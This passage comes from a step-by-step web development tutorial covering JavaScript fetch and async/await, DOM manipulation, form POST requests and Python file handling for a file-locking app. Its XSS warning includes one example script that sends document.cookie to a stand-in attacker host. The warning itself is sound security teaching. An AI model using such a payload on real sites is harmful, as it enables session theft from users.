    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  }
}
```

---

### 1) Short summary — what this code does

1. Logs "Loading files from API..."
2. Calls `fetch("/api/files")`, which returns a **Promise** for a `Response` object (async network request).
3. `await` pauses `loadFiles` (non-blocking) until that Promise resolves.
4. Checks `response.ok` to detect HTTP error codes (4xx/5xx).
5. Calls `response.json()` (also returns a Promise) and `await`s it to get parsed data.
6. Calls `displayFiles(data.files)` if everything OK; otherwise handles errors in the `catch`.

---

### 2) Line-by-line execution _at runtime_ (step-by-step)

When `loadFiles()` is invoked:

1. **Call** `loadFiles()` — it immediately returns a Promise (because async functions always return a Promise).
2. Synchronous: `console.log("Loading files from API...")` prints.
3. `fetch("/api/files")` is called. `fetch` starts an HTTP request and **returns a Promise** (let's call it `Pfetch`). The JS engine continues; it does **not** block the main thread.
4. `await Pfetch`:

   - The async function yields control; the remainder of `loadFiles` is scheduled as a **microtask** to resume when `Pfetch` resolves.
   - Meanwhile the event loop keeps running (UI remains responsive).

5. When the HTTP response arrives, `Pfetch` resolves with a `Response` object. The microtask queue schedules the continuation of the async function; continuation runs _before_ the next macrotask (e.g., `setTimeout`).
6. The code checks `response.ok`. If false, `throw new Error(...)` -> rejects the Promise returned by `loadFiles()` and jumps to `catch`.
7. If ok, call `response.json()` -> returns a Promise (`Pjson`) because parsing is async. `await Pjson` again yields control until parsing finishes.
8. When parsing completes, `data` is available. Then `displayFiles(data.files)` is called synchronously.
9. If any awaited Promise rejects, control jumps to the `catch` block where the error is handled (logged and user-facing message displayed). The Promise returned by `loadFiles()` settles (resolved on success, rejected only if re-thrown outside the `catch`).

---

### 3) Under-the-hood: Promises, `await`, and the event loop

- **Promises**: represent future values. `fetch()` returns a Promise. `response.json()` returns a Promise.

- **`async` function**: syntactic sugar — an `async` function returns a Promise. `await` is sugar over `.then()`:

  - `const res = await fetch()` ≈ `fetch().then(res => { ... })` (but `await` is sequential and easier to read).

- **Event loop & microtasks**:

  - When an `await` suspends, the continuation is scheduled as a microtask (i.e., it runs before the next macrotask like `setTimeout`).
  - `.then()` callbacks are also microtasks.
  - Example ordering:

    ```js
    console.log("start");
    setTimeout(() => console.log("timeout"), 0);
    Promise.resolve().then(() => console.log("promise"));
    console.log("end");
    // Prints: start, end, promise, timeout
    ```

- **Important fetch behavior**:

  - `fetch` _does not_ reject on HTTP error codes (404/500). It resolves with a `Response` whose `.ok` property is false. You must check `response.ok` and inspect `response.status`.
  - `fetch` rejects on network failure, CORS failures, or if the request was aborted.

---

### 4) Short history — how we got here

- **1999 (late/early 2000s)**: `XMLHttpRequest` existed in early browsers (IE introduced a variant earlier); people used it directly with callbacks for asynchronous network requests.
- **2005**: The term **AJAX** ("Asynchronous JavaScript and XML") popularized the pattern of async requests from the browser (Jesse James Garrett).
- **ES6 / ES2015** (~2015):

  - **Promises** became standard. `.then()` chains replaced deeply nested callbacks.

- **Fetch API** (~2015): modern Promise-based replacement for `XMLHttpRequest`. Cleaner API and streams support.
- **ES2017 / ES8** (~2017): **async/await** added — syntactic sugar over Promises to write asynchronous code that looks synchronous.

(This is a compressed timeline; the key point: callbacks → promises → async/await with `fetch` replacing XHR.)

---

### 5) Equivalent forms (showing the relation)

### Callback + XHR (old style)

```javascript
function loadFilesXHR() {
  console.log("Loading files from API (XHR)...");
  const xhr = new XMLHttpRequest();
  xhr.open("GET", "/api/files");
  xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 300) {
      const data = JSON.parse(xhr.responseText);
      displayFiles(data.files);
    } else {
      console.error("HTTP error", xhr.status);
      displayError("Failed to load files. Please refresh.");
    }
  };
  xhr.onerror = function () {
    console.error("Network error");
    displayError("Failed to load files. Please refresh.");
  };
  xhr.send();
}
```

### Promise chain (`fetch` + `.then`)

```javascript
function loadFilesThen() {
  console.log("Loading files from API (then)...");
  fetch("/api/files")
    .then((response) => {
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return response.json(); // returns a Promise
    })
    .then((data) => displayFiles(data.files))
    .catch((err) => {
      console.error("Error loading files:", err);
      displayError("Failed to load files. Please refresh.");
    });
}
```

### `async/await` (your version) — clearer linear flow

```javascript
async function loadFiles() {
  try {
    const response = await fetch("/api/files");
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    displayFiles(data.files);
  } catch (err) {
    // ...
  }
}
```

---

### 6) Mapping conceptually to Python `httpx` / `requests`

**Sync (requests):**

```python
import requests

def load_files():
    resp = requests.get("http://localhost:8000/api/files")  # blocking
    if resp.status_code != 200:
        raise RuntimeError(f"HTTP {resp.status_code}")
    data = resp.json()
    display_files(data["files"])
```

**Async (`httpx`):**

```python
import asyncio
import httpx

async def load_files_async():
    async with httpx.AsyncClient() as client:
        resp = await client.get("http://localhost:8000/api/files")
        resp.raise_for_status()  # raises for 4xx/5xx
        data = resp.json()
        display_files(data["files"])

### run with: asyncio.run(load_files_async())
```

- `await` in JS ≈ `await` in Python `asyncio`.
- `fetch` ≈ `httpx.AsyncClient().get()`.
- In Python sync `requests`, calls block the thread; in browsers, `fetch` is non-blocking (but single-threaded event loop). In Python, use `async` to get concurrency.

---

### 7) Advanced practical patterns

### a) Timeouts with `AbortController`

```javascript
async function loadFilesWithTimeout(timeoutMs = 5000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch("/api/files", { signal: controller.signal });
    clearTimeout(id);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    displayFiles(data.files);
  } catch (err) {
    if (err.name === "AbortError") {
      displayError("Request timed out");
    } else {
      displayError("Network error");
    }
  }
}
```

### b) Retries with exponential backoff + jitter

```javascript
async function fetchWithRetries(url, retries = 3) {
  let delay = 200; // ms
  for (let i = 0; i <= retries; i++) {
    try {
      const res = await fetch(url);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      return await res.json();
    } catch (err) {
      if (i === retries) throw err;
      // exponential backoff with jitter
      const jitter = Math.random() * delay;
      await new Promise((r) => setTimeout(r, delay + jitter));
      delay *= 2;
    }
  }
}
```

### c) Parallel requests: `Promise.all` vs `Promise.allSettled`

```javascript
// Parallel -> fails fast if any reject:
const urls = ["/api/a", "/api/b"];
const results = await Promise.all(
  urls.map((u) => fetch(u).then((r) => r.json()))
);

// Wait for all, but capture successes and failures:
const settled = await Promise.allSettled(
  urls.map((u) => fetch(u).then((r) => r.json()))
);
```

### d) Concurrency limit (N at a time)

Simple queue/worker pattern:

```javascript
async function limitedMap(inputs, mapper, limit = 3) {
  const results = [];
  const executing = new Set();
  for (const item of inputs) {
    const p = Promise.resolve().then(() => mapper(item));
    results.push(p);
    executing.add(p);
    p.finally(() => executing.delete(p));
    if (executing.size >= limit) {
      await Promise.race(executing);
    }
  }
  return Promise.all(results);
}
```

### e) Cancellation & cleanup

- Use `AbortController` to cancel fetch.
- Clean up UI on abort.
- For long-running CPU tasks, use Web Workers.

---

### 8) Best practices checklist (quick)

- Always check `response.ok` for HTTP status errors.
- Use `AbortController` for timeouts and cancellation.
- Use `try/catch` inside `async` functions to handle promise rejections.
- Don’t block the main thread; use workers for CPU-heavy work.
- Use `Promise.allSettled` if you need per-request results even on failures.
- Limit concurrency when fetching many resources.
- For retries, add exponential backoff + jitter.
- For cross-origin, ensure CORS and credentials are configured (`fetch(..., { credentials: 'include' })` when needed).
- Prefer streaming (`response.body.getReader()`) for very large responses.

---

### 9) Common gotchas

- `fetch` won’t reject on 404 — check `.ok`.
- `await` **does not** create a new thread; it suspends the async function but the JS thread is still single-threaded.
- `async function` always returns a Promise — if you `return 42`, the function resolves to `42`.
- Promise rejections that are not caught will surface as unhandled rejections.
- When using `await` in loops, be careful: `for (item of items) await fetch(item)` is sequential (slow). Use `Promise.all` for parallel runs when safe.

---

### 10) Playground exercises (practice)

Try these in order. I put solutions after the exercises.

1. **Rewrite** `loadFiles` using `.then()` chains (no `async/await`) and ensure errors are handled.
2. **XHR**: Implement `loadFilesXHR()` using `XMLHttpRequest` and callbacks.
3. **Timeout**: Add a 3s timeout to `loadFiles` using `AbortController`. If timeout, show "timed out".
4. **Retry**: Implement `fetchWithRetries(url, attempts)` with exponential backoff and jitter.
5. **Parallel fetch**: Given `const fileUrls = ["/api/f1", "/api/f2", "/api/f3"]`, fetch all in parallel, but handle if any single fetch returns a 404 by ignoring that file (keep the rest).
6. **Concurrency limit**: Fetch 20 URLs but only 4 at a time. Return an array of results (or errors).
7. **Python async**: Write the `httpx` async equivalent of your original `loadFiles` and include a 5s timeout.

---

### 11) Solutions

### 1) `.then()` version

```javascript
function loadFilesThen() {
  console.log("Loading files from API...");
  fetch("/api/files")
    .then((response) => {
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return response.json();
    })
    .then((data) => {
      console.log("Received data:", data);
      displayFiles(data.files);
    })
    .catch((error) => {
      console.error("Error loading files:", error);
      displayError("Failed to load files. Please refresh the page.");
    });
}
```

### 2) XHR version

(see earlier XHR snippet — included again)

```javascript
function loadFilesXHR() {
  console.log("Loading files from API (XHR)...");
  const xhr = new XMLHttpRequest();
  xhr.open("GET", "/api/files");
  xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 300) {
      const data = JSON.parse(xhr.responseText);
      displayFiles(data.files);
    } else {
      console.error("HTTP error", xhr.status);
      displayError("Failed to load files. Please refresh.");
    }
  };
  xhr.onerror = function () {
    console.error("Network error");
    displayError("Failed to load files. Please refresh.");
  };
  xhr.send();
}
```

### 3) Timeout with `AbortController`

(see earlier snippet — same as solution)

```javascript
async function loadFilesWithTimeout(timeoutMs = 3000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch("/api/files", { signal: controller.signal });
    clearTimeout(id);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    displayFiles(data.files);
  } catch (err) {
    if (err.name === "AbortError") {
      displayError("Request timed out");
    } else {
      displayError("Failed to load files. Please refresh.");
    }
  }
}
```

### 4) Retry with backoff & jitter

(see earlier snippet `fetchWithRetries` — same)

```javascript
async function fetchWithRetries(url, retries = 3) {
  let delay = 200;
  for (let i = 0; i <= retries; i++) {
    try {
      const res = await fetch(url);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      return await res.json();
    } catch (err) {
      if (i === retries) throw err;
      const jitter = Math.random() * delay;
      await new Promise((r) => setTimeout(r, delay + jitter));
      delay *= 2;
    }
  }
}
```

### 5) Parallel fetch ignoring 404s

```javascript
async function fetchFilesIgnore404(urls) {
  const promises = urls.map(async (url) => {
    const r = await fetch(url);
    if (!r.ok) {
      if (r.status === 404) return null; // ignore missing file
      throw new Error(`HTTP ${r.status} for ${url}`);
    }
    return await r.json();
  });

  // if you want to fail on other HTTP errors, use Promise.all(promises)
  // to collect rejections. Here we'll use allSettled to see outcomes:
  const settled = await Promise.allSettled(promises);
  return settled
    .filter((s) => s.status === "fulfilled")
    .map((s) => s.value)
    .filter(Boolean); // remove nulls from 404s
}
```

### 6) Concurrency limit (worker queue)

```javascript
async function limitedFetch(urls, concurrent = 4) {
  const results = new Array(urls.length);
  let idx = 0;

  async function worker() {
    while (idx < urls.length) {
      const i = idx++;
      try {
        const res = await fetch(urls[i]);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        results[i] = await res.json();
      } catch (err) {
        results[i] = { __error: err.message };
      }
    }
  }

  // start workers
  await Promise.all(Array.from({ length: concurrent }, () => worker()));
  return results;
}
```

### 7) Python `httpx` async with timeout

```python
import asyncio
import httpx

async def load_files_httpx():
    async with httpx.AsyncClient(timeout=5.0) as client:  # 5s timeout
        resp = await client.get("http://localhost:8000/api/files")
        resp.raise_for_status()
        data = resp.json()
        display_files(data["files"])

### Run: asyncio.run(load_files_httpx())
```

---

### 12) Final notes — mental model & how to teach others

- **Mental model**: `async/await` lets you write asynchronous sequences in linear form. Under the hood it's still Promises and the event loop.
- **Teaching progression**:

  1. Show blocking vs non-blocking with trivial `setTimeout` examples.
  2. Introduce callbacks (XHR) and show callback hell.
  3. Introduce Promises and `.then()` as a cleaner abstraction.
  4. Introduce `fetch()` which returns Promises.
  5. Finally introduce `async/await` as syntactic sugar over Promises.
  6. Demonstrate concurrency patterns (`Promise.all`, limits) and cancellation (`AbortController`).

- **Practice**: hands-on exercises (above) plus instrumentation: log timestamps and durations around network calls to see concurrency in action.

---

### DOM Manipulation

**Finding elements:**

```javascript
// By ID
const el = document.getElementById("file-list");

// By class name (returns array-like object)
const items = document.getElementsByClassName("file-item");

// By CSS selector (modern, most flexible)
const el = document.querySelector("#file-list");
const items = document.querySelectorAll(".file-item");
```

**Creating elements:**

```javascript
const div = document.createElement("div");
div.className = "file-item";
div.textContent = "Some text";
```

**Adding to DOM:**

```javascript
container.appendChild(div); // Add as last child
container.insertBefore(div, ref); // Add before reference element
```

**Changing content:**

```javascript
el.textContent = "Plain text"; // Sets text (safe, can't inject HTML)
el.innerHTML = "<b>HTML</b>"; // Sets HTML (dangerous if user input!)
```

**⚠️ Security Warning: XSS**

**NEVER do this with user input:**

```javascript
// DANGEROUS!
el.innerHTML = userInput;
```

**Why?** User could input:

```html
<script>
  fetch("https://evil.com/steal?data=" + document.cookie);
</script>
```

**Safe alternative:**

```javascript
el.textContent = userInput; // Treats everything as plain text
```

---

## 2.6: Test the Complete Stack

### Open Browser Developer Tools

**Chrome/Edge:** Press `F12` or `Ctrl+Shift+I` (Windows) / `Cmd+Opt+I` (Mac)  
**Firefox:** Press `F12`

**The tabs you'll use:**

- **Elements/Inspector** - View and edit DOM
- **Console** - See `console.log()` output and errors
- **Network** - See HTTP requests
- **Sources** - Debug JavaScript

### Load the Page

Visit: `http://127.0.0.1:8000`

### Check the Console

You should see:

```
DOM fully loaded
Loading files from API...
Received data: {files: Array(3)}
Displayed 3 files
```

### Check the Network Tab

1. Click "Network" tab
2. Refresh the page (`F5`)
3. You'll see all requests:
   - `localhost` - The HTML file
   - `style.css` - The CSS file
   - `app.js` - The JavaScript file
   - `files` - The API request to `/api/files`

**Click on `files` request:**

- **Headers** tab shows request/response headers
- **Preview** tab shows formatted JSON
- **Response** tab shows raw JSON

**This is your entire frontend-backend communication visible!**

---

## 2.7: Adding User Interaction - Event Listeners

Let's add a button to reload the file list.

### Update HTML

Modify `backend/static/index.html`:

```html
<section id="file-list-section">
  <div
    style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;"
  >
    <h2>Available Files</h2>
    <button id="refresh-btn" class="btn">Refresh</button>
  </div>
  <div id="file-list">
    <p>Loading files...</p>
  </div>
</section>
```

### Update CSS

Add to `backend/static/css/style.css`:

```css
/* ============================================
   BUTTONS
   ============================================ */

.btn {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  padding: 0.75rem 1.5rem;
  border-radius: 4px;
  font-size: 1rem;
  cursor: pointer;
  transition: all 0.3s ease;
  font-weight: 500;
}

.btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
}

.btn:active {
  transform: translateY(0);
}
```

### Update JavaScript

Add to `backend/static/js/app.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded");

  // Initial load
  loadFiles();

  // Add event listener to refresh button
  const refreshBtn = document.getElementById("refresh-btn");
  refreshBtn.addEventListener("click", function () {
    console.log("Refresh button clicked");
    loadFiles();
  });
});
```

### Understanding Event Listeners

```javascript
refreshBtn.addEventListener("click", function () {
  loadFiles();
});
```

**Breaking it down:**

- `refreshBtn` - The DOM element (the button)
- `.addEventListener()` - Register a listener
- `'click'` - The event type (also: `'mouseover'`, `'keydown'`, `'submit'`, etc.)
- `function() { ... }` - The callback function (runs when event fires)

**The Event Loop (How This Works):**

1. User clicks button
2. Browser creates a `click` event
3. Browser checks: "Does this element have click listeners?"
4. Finds your callback function
5. **Adds callback to the event queue**
6. Event loop picks it up and runs it
7. Your `loadFiles()` function executes

**This is asynchronous!** The click handler doesn't block anything.

### Test It

Refresh the page, click "Refresh" button.

**In the Console, you'll see:**

```
Refresh button clicked
Loading files from API...
Received data: {files: Array(3)}
Displayed 3 files
```

**In the Network tab:**

- Each click makes a new `/api/files` request

---

## 2.8: Form Input and POST Requests

Let's add a simple checkout form.

### Update HTML

Add this section to `index.html` (before the file list section):

```html
<section>
  <h2>Checkout File</h2>
  <form id="checkout-form">
    <div class="form-group">
      <label for="filename">Filename:</label>
      <input
        type="text"
        id="filename"
        name="filename"
        required
        placeholder="e.g., PN1001_OP1.mcam"
      />
    </div>

    <div class="form-group">
      <label for="user">Your Name:</label>
      <input
        type="text"
        id="user"
        name="user"
        required
        placeholder="e.g., John Doe"
      />
    </div>

    <div class="form-group">
      <label for="message">Message:</label>
      <input
        type="text"
        id="message"
        name="message"
        required
        placeholder="Why are you checking out this file?"
      />
    </div>

    <button type="submit" class="btn">Checkout</button>
  </form>
  <div id="checkout-result"></div>
</section>
```

### Update CSS

Add to `style.css`:

```css
/* ============================================
   FORMS
   ============================================ */

.form-group {
  margin-bottom: 1.5rem;
}

label {
  display: block;
  margin-bottom: 0.5rem;
  font-weight: 500;
  color: #333;
}

input[type="text"] {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
  transition: border-color 0.3s ease;
}

input[type="text"]:focus {
  outline: none;
  border-color: #667eea;
  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}

#checkout-result {
  margin-top: 1rem;
  padding: 1rem;
  border-radius: 4px;
  display: none;
}

#checkout-result.success {
  display: block;
  background: #d4edda;
  color: #155724;
  border: 1px solid #c3e6cb;
}

#checkout-result.error {
  display: block;
  background: #f8d7da;
  color: #721c24;
  border: 1px solid #f5c6cb;
}
```

### Update JavaScript

Add to `app.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded");
  loadFiles();

  // Refresh button
  const refreshBtn = document.getElementById("refresh-btn");
  refreshBtn.addEventListener("click", () => loadFiles());

  // Checkout form
  const checkoutForm = document.getElementById("checkout-form");
  checkoutForm.addEventListener("submit", handleCheckout);
});

// ============================================
// HANDLE CHECKOUT FORM SUBMISSION
// ============================================

async function handleCheckout(event) {
  // Prevent default form submission (which would reload the page)
  event.preventDefault();

  // Get form data
  const filename = document.getElementById("filename").value;
  const user = document.getElementById("user").value;
  const message = document.getElementById("message").value;

  console.log("Submitting checkout:", { filename, user, message });

  try {
    const response = await fetch("/api/checkout", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        filename: filename,
        user: user,
        message: message,
      }),
    });

    const data = await response.json();

    if (response.ok) {
      showResult(data.message, "success");
      // Clear form
      event.target.reset();
      // Reload file list
      loadFiles();
    } else {
      showResult("Error: " + (data.detail || "Unknown error"), "error");
    }
  } catch (error) {
    console.error("Checkout error:", error);
    showResult("Network error. Please try again.", "error");
  }
}

// ============================================
// SHOW RESULT MESSAGE
// ============================================

function showResult(message, type) {
  const resultDiv = document.getElementById("checkout-result");
  resultDiv.textContent = message;
  resultDiv.className = type;

  // Hide after 5 seconds
  setTimeout(() => {
    resultDiv.style.display = "none";
  }, 5000);
}
```

### Understanding Form Submission

**`event.preventDefault()`**

```javascript
async function handleCheckout(event) {
  event.preventDefault(); // ← CRITICAL
  // ...
}
```

**What happens WITHOUT this:**

1. User clicks "Submit"
2. Browser's default behavior: reload page with form data in URL
3. Your JavaScript never runs
4. Page reloads, losing all state

**With `preventDefault()`:**

1. User clicks "Submit"
2. Browser default is cancelled
3. Your JavaScript runs
4. You control what happens (make API call, show result)

### Making a POST Request

```javascript
const response = await fetch("/api/checkout", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    filename: filename,
    user: user,
    message: message,
  }),
});
```

**Breaking it down:**

- `method: 'POST'` - Use POST instead of GET
- `headers: { 'Content-Type': 'application/json' }` - Tell server we're sending JSON
- `body: JSON.stringify(...)` - Convert JavaScript object to JSON string

**Why `JSON.stringify()`?**

JavaScript object:

```javascript
{ filename: "test.mcam", user: "John" }
```

JSON string (what HTTP actually sends):

```json
"{\"filename\":\"test.mcam\",\"user\":\"John\"}"
```

The network can only send text. `JSON.stringify()` converts object → text.

### Test It

1. Fill out the form
2. Click "Checkout"
3. **Check the Network tab** - you'll see the POST request
4. **Check the Console** - you'll see the logs
5. Success message appears
6. Form clears

---

## 2.9: The Browser Rendering Pipeline

Understanding how the browser turns your code into pixels.

### The Steps

**1. HTML Parsing → DOM Tree**

```
HTML String → Parser → DOM Tree
```

**2. CSS Parsing → CSSOM Tree**

```
CSS String → Parser → CSSOM (CSS Object Model)
```

**3. Combine → Render Tree**

```
DOM + CSSOM → Render Tree (only visible elements)
```

**4. Layout (Reflow)**

- Calculate position and size of every element
- Box model calculations happen here

**5. Paint**

- Fill in pixels
- Text, colors, images, shadows

**6. Composite**

- Combine layers (elements with `position: fixed`, animations)
- Send to GPU

### Performance Implications

**Expensive Operations:**

- **Reflow** - Changing element size/position forces recalculation of entire layout
- **Repaint** - Changing colors/backgrounds repaints pixels

**Cheap Operations:**

- **Composite** - Only layer positioning (transform, opacity)

**Example:**

```javascript
// SLOW - Causes reflow
element.style.width = "200px";

// FAST - Only causes composite
element.style.transform = "translateX(200px)";
```

**This is why CSS transitions on `transform` are smooth.**

---

## Stage 2 Complete - You Built a Frontend

### What You Built

You now have:

- A complete HTML/CSS/JavaScript frontend
- Static file serving from FastAPI
- API requests (GET and POST) from JavaScript
- User interaction with event listeners
- Form handling
- Dynamic DOM manipulation
- Async/await in JavaScript

### Your File Structure

```
backend/
├── main.py            # FastAPI backend with API endpoints
├── static/
│   ├── index.html     # HTML structure
│   ├── css/
│   │   └── style.css  # Styling
│   └── js/
│       └── app.js     # JavaScript behavior
└── test_main.py       # Tests
```

### Verification Checklist

- [ ] Can see styled page at `http://127.0.0.1:8000`
- [ ] Files load from API automatically
- [ ] Refresh button works
- [ ] Can submit checkout form
- [ ] Form shows success message
- [ ] Understand HTML/CSS/JS relationship
- [ ] Understand DOM manipulation
- [ ] Understand async/await in JavaScript
- [ ] Can use browser dev tools

#

In **Stage 3**, we'll make this app actually DO something by:

- Reading files from the filesystem
- Implementing real checkout logic
- Adding file locking
- Storing data in JSON files
- Learning file I/O in Python

The foundation is complete. Now we build the real application.

---

### Stage 3: App Core Features - Real File Operations & Locking

## Introduction: The Goal of This Stage

So far, your app uses hardcoded data. In this stage, you'll make it REAL by:

- Reading actual files from the filesystem
- Implementing file locking (the core PDM feature)
- Persisting data in JSON files
- Handling concurrent operations safely
- Understanding file I/O deeply
- Learning about race conditions and how to prevent them

By the end of this stage, you will:

- Read files from a `repo/` directory
- Store lock information in `locks.json`
- Prevent two users from editing the same file simultaneously
- Understand Python's file I/O operations
- Handle errors gracefully
- Update your frontend to checkout/checkin files

**Time Investment:** 5-7 hours

---

## 3.1: Understanding the Filesystem

### What is a Filesystem?

The **filesystem** is how your operating system organizes files on disk. Think of it like a filing cabinet:

- **Directories (folders)** = Drawers and folders
- **Files** = Individual documents
- **Paths** = The address to find a document

### Absolute vs Relative Paths

**Absolute Path** - Full address from root:

```
Windows:   C:\Users\YourName\pdm-tutorial\backend\repo\file.mcam
macOS:     /Users/YourName/pdm-tutorial/backend/repo/file.mcam
Linux:     /home/yourname/pdm-tutorial/backend/repo/file.mcam
```

**Relative Path** - Address from current directory:

```
./repo/file.mcam           # Current dir → repo → file.mcam
../backend/repo/file.mcam  # Up one level → backend → repo
repo/file.mcam             # Shorthand (same as ./)
```

### The Current Working Directory

Every running program has a **current working directory** (cwd).

**Find it in Python:**

```python
import os
print(os.getcwd())
### Output: /Users/yourname/pdm-tutorial/backend
```

**Why this matters:**

- Relative paths are relative TO the cwd
- If you run `python main.py` from different locations, relative paths break
- We'll use absolute paths for reliability

---

## 3.2: Creating the Repository Structure

### Create the Repo Directory

```bash
### In backend/ directory
mkdir -p repo
```

### Add Sample Files

Create some dummy `.mcam` files:

```bash
### In backend/ directory
cd repo

### Create sample files (these are just text files for testing)
echo "G0 X0 Y0" > PN1001_OP1.mcam
echo "G0 X10 Y10" > PN1002_OP1.mcam
echo "G0 X20 Y20" > PN1003_OP1.mcam
echo "G0 X30 Y30" > PN1234567-A.mcam

cd ..
```

**Your structure:**

```
backend/
├── main.py
├── repo/
│   ├── PN1001_OP1.mcam
│   ├── PN1002_OP1.mcam
│   ├── PN1003_OP1.mcam
│   └── PN1234567-A.mcam
└── static/
    └── ...
```

---

## 3.3: Reading Files in Python - Deep Dive

### The `os` Module

Python's `os` module provides operating system functionality.

**Common operations:**

```python
import os

### Current directory
cwd = os.getcwd()

### List files in a directory
files = os.listdir('repo')
### Returns: ['PN1001_OP1.mcam', 'PN1002_OP1.mcam', ...]

### Check if path exists
exists = os.path.exists('repo/PN1001_OP1.mcam')  # True

### Check if it's a file (not directory)
is_file = os.path.isfile('repo/PN1001_OP1.mcam')  # True

### Check if it's a directory
is_dir = os.path.isdir('repo')  # True

### Get file size (in bytes)
size = os.path.getsize('repo/PN1001_OP1.mcam')

### Join paths (handles OS differences)
path = os.path.join('repo', 'PN1001_OP1.mcam')
### Returns: 'repo/PN1001_OP1.mcam'
```

### Path Operations with `os.path`

```python
import os

path = '/home/user/pdm-tutorial/backend/repo/PN1001_OP1.mcam'

### Get just the directory
dirname = os.path.dirname(path)
### Returns: '/home/user/pdm-tutorial/backend/repo'

### Get just the filename
basename = os.path.basename(path)
### Returns: 'PN1001_OP1.mcam'

### Split into directory and filename
dir_part, file_part = os.path.split(path)

### Split filename and extension
name, ext = os.path.splitext('PN1001_OP1.mcam')
### name: 'PN1001_OP1', ext: '.mcam'

### Get absolute path
abs_path = os.path.abspath('repo/file.mcam')
### Converts relative → absolute based on cwd
```

### Creating Absolute Paths

**The Problem with Relative Paths:**

```python
### If you're in /backend
os.listdir('repo')  # Works

### If you're in /
os.listdir('repo')  # Error: repo doesn't exist here!
```

**The Solution:**

```python
import os

### Get the directory where THIS Python file lives
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

### __file__ is a special variable = path to current .py file
### os.path.abspath(__file__) makes it absolute
### os.path.dirname(...) gets just the directory part

### Now build absolute path to repo
REPO_PATH = os.path.join(BASE_DIR, 'repo')

### This ALWAYS works, regardless of where you run the script
files = os.listdir(REPO_PATH)
```

**Add this to `main.py`:**

```python
import os
from pathlib import Path

### Get absolute path to the directory containing this file
BASE_DIR = Path(__file__).resolve().parent

### Path to repository folder
REPO_PATH = BASE_DIR / 'repo'

### Path to locks file (we'll create this soon)
LOCKS_FILE = BASE_DIR / 'locks.json'
```

**Note:** We're using `pathlib.Path` (modern) instead of `os.path` (old style). Both work; `Path` is cleaner.

---

## 3.4: Reading the File List

### Update the API Endpoint

Replace your hardcoded `get_files()` in `main.py`:

```python
from pathlib import Path
from typing import List
import os

### At the top, after imports
BASE_DIR = Path(__file__).resolve().parent
REPO_PATH = BASE_DIR / 'repo'

@app.get("/api/files")
def get_files():
    """
    Returns a list of all .mcam files in the repository.
    """
    logger.info(f"Scanning repository: {REPO_PATH}")

    # Check if repo directory exists
    if not REPO_PATH.exists():
        logger.error(f"Repository path does not exist: {REPO_PATH}")
        raise HTTPException(
            status_code=500,
            detail="Repository directory not found"
        )

    # Get all files in repo directory
    all_items = os.listdir(REPO_PATH)
    logger.info(f"Found {len(all_items)} items in repo")

    # Filter to only .mcam files
    files = []
    for filename in all_items:
        # Build full path
        full_path = REPO_PATH / filename

        # Check if it's a file (not directory) and has .mcam extension
        if full_path.is_file() and filename.endswith('.mcam'):
            files.append({
                "name": filename,
                "status": "available",  # For now, all are available
                "size": full_path.stat().st_size  # Size in bytes
            })

    logger.info(f"Returning {len(files)} .mcam files")

    return {"files": files}
```

### Understanding the Code

**`REPO_PATH.exists()`**

- Checks if path exists on filesystem
- Returns `True` or `False`
- Good practice: always check before accessing

**`os.listdir(REPO_PATH)`**

- Returns list of filenames (strings)
- Does NOT include subdirectories' contents
- Order is arbitrary (not sorted)

**`full_path.is_file()`**

- `Path` object method
- Checks if it's a file (vs. directory)
- Returns `False` for directories

**`filename.endswith('.mcam')`**

- String method
- Case-sensitive! `.MCAM` won't match
- Better: `filename.lower().endswith('.mcam')`

**`full_path.stat().st_size`**

- `.stat()` returns file metadata
- `.st_size` is size in bytes
- Other attributes: `.st_mtime` (modified time), `.st_ctime` (created time)

### Test It

**Restart your server:**

```bash
uvicorn main:app --reload
```

**Visit:** `http://127.0.0.1:8000`

**You should see:**

- PN1001_OP1.mcam
- PN1002_OP1.mcam
- PN1003_OP1.mcam
- PN1234567-A.mcam

**All real files from your `repo/` directory!**

---

## 3.5: Working with JSON Files

### What is JSON?

**JSON (JavaScript Object Notation)** is a text format for storing data.

**Why JSON?**

- Human-readable
- Easy to parse in any language
- Standard for web APIs
- Built into Python (`json` module)

**Example:**

```json
{
  "name": "John Doe",
  "age": 30,
  "active": true,
  "skills": ["Python", "JavaScript"],
  "address": {
    "city": "Boston",
    "state": "MA"
  }
}
```

### Python ↔ JSON Mapping

| Python         | JSON     |
| -------------- | -------- |
| `dict`         | `object` |
| `list`         | `array`  |
| `str`          | `string` |
| `int`, `float` | `number` |
| `True`         | `true`   |
| `False`        | `false`  |
| `None`         | `null`   |

### Reading JSON

```python
import json

### Read from file
with open('data.json', 'r') as f:
    data = json.load(f)  # Returns Python dict/list

### Parse from string
json_string = '{"name": "John", "age": 30}'
data = json.loads(json_string)  # Note the 's' in loads
```

### Writing JSON

```python
import json

data = {
    "name": "John",
    "age": 30,
    "skills": ["Python", "JavaScript"]
}

### Write to file
with open('data.json', 'w') as f:
    json.dump(data, f, indent=4)
